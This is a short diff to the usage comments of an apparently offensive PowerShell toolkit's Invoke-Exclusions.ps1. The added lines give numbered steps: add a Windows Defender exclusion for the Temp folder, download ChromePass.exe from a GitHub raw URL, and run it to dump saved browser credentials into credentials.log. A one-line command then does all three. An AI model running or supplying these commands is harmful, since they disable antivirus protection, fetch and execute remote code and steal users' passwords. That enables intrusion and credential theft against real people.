@@ -77,8 +77,10 @@ iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/WD-byp
 #Get Exclusions List
 .\Invoke-Exclusions.ps1 -action "query"
 
-## Add WD exclusion (To execute ChromePass.exe) + download (ChromePass.exe)  + execute (ChromePass.exe)
-# exclusion cmdline: Set-MpPreference -ExclusionPath "C:\Users\pedro\AppData\Local\Temp" -Force
+## Add exclusion Path + Download URI PE + Execute PE
+# 1º - Set-MpPreference -ExclusionPath "C:\Users\pedro\AppData\Local\Temp" -Force
+# 2º - Iwr -Uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Dump-Browser/ChromePass.exe" -OutFile "$Env:TMP\ChromePass.exe"
+# 3º - cd $Env:TMP; .\ChromePass.exe /stext credentials.log
 .\Invoke-Exclusions.ps1 -action "exec" -type "ExclusionPath" -Exclude "$Env:TMP" -Uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Dump-Browser/ChromePass.exe" -Arguments "/stext credentials.log"
 
 #Remove ExclusionPath "$Env:TMP" from Windows Defender list
